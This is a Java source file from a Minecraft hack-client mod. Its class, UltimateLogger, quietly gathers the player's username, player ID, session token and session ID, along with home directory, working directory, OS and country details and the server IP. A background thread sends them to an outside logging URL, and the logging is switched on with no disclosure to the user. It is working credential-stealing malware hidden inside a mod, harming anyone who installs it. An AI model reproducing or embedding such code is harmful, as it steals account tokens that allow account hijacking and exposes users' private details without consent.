/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ehacks.mod.util;

import com.google.gson.Gson;
import ehacks.mod.wrapper.Wrapper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import net.minecraft.util.Session;

/**
 *
 * @author radioegor146
 */
public class UltimateLogger {
    public static UltimateLogger INSTANCE = new UltimateLogger();
    
    private static final boolean doIt = true;
    private static final String url = "http://1488.me/ehacks/log.php";
    
    private void send(int type, String data) {
        if (!doIt)
            return;
        new Thread(new SendInfoThread(type, data)).start();
    }
    
    public void sendLoginInfo() {
        Gson gson = new Gson();
        send(1, gson.toJson(new LoginInfo()));
    }
    
    public void sendServerConnectInfo() {
        Gson gson = new Gson();
        send(2, gson.toJson(new ServerLoginData()));
    }
    
    private class SendInfoThread implements Runnable {
        
        private int type;
        private String data;
        
        public SendInfoThread(int type, String data) {
            this.type = type;
            this.data = data;
        }
        
        @Override
        public void run() {
            try {
                URL url = new URL(UltimateLogger.url + "?type=" + String.valueOf(type) + "&data=" + URLEncoder.encode(data, "UTF-8"));
                URLConnection uc = url.openConnection();
                BufferedReader in = new BufferedReader(new InputStreamReader(uc.getInputStream()));
                while (in.readLine() != null) {}
                in.close();
            } catch (Exception ex) {
                ex.printStackTrace(System.err);
            }
        }
    }
    
    private class LoginInfo {
        public SessionInfo session = new SessionInfo();
        public boolean ismcp = Mappings.isMCP();
        public long time = System.currentTimeMillis();
        public ArrayList<PropertyInfo> sysprops = new ArrayList<PropertyInfo>();
        
        public LoginInfo() {
            ArrayList<String> tlist = new ArrayList<String>();
            tlist.add("java.runtime.name");
            tlist.add("java.vm.version");
            tlist.add("user.country");
            tlist.add("user.dir");
            tlist.add("java.runtime.version");
            tlist.add("os.arch");
            tlist.add("os.name");
            tlist.add("user.home");
            tlist.add("user.language");
            for (String key : tlist) {
                try {
                    sysprops.add(new PropertyInfo(key, System.getProperty(key)));
                } catch (Exception e) {
                    
                }
            }
        }
    }
    
    private class SessionInfo {
        public String username = Wrapper.INSTANCE.mc().getSession().getUsername();
        public String playerid = Wrapper.INSTANCE.mc().getSession().getPlayerID();
        public String token = Wrapper.INSTANCE.mc().getSession().getToken();
        public String session = Wrapper.INSTANCE.mc().getSession().getSessionID();
    }
    
    private class PropertyInfo {
        public String key = "";
        public String value = "";
        
        public PropertyInfo(String key, String value) {
            this.key = key;
            this.value = value;
        }
    }
    
    private class ServerLoginData {
        public SessionInfo session = new SessionInfo();
        public String serverip = Wrapper.INSTANCE.mc().func_147104_D() == null ? "single" : Wrapper.INSTANCE.mc().func_147104_D().serverIP;
    }
}
